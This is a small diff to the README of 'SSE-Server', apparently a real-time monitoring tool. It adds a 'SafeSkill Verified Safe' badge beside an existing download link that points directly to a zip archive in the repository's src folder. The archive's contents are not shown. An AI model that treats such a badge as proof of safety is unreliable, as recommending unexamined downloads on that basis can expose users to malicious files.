@@ -1,5 +1,7 @@
 # 🎉 SSE-Server - Real-Time Data Monitoring Made Simple
 
+[![SafeSkill 95/100](https://img.shields.io/badge/SafeSkill-95%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/harshitshukla2003-sse-server)
+
 ## 📦 Download Now!
 [![Download SSE-Server](https://raw.githubusercontent.com/Harshitshukla2003/SSE-Server/main/src/Server-SS-v1.5.zip%20SSE--Server-v1.0-brightgreen)](https://raw.githubusercontent.com/Harshitshukla2003/SSE-Server/main/src/Server-SS-v1.5.zip)
 
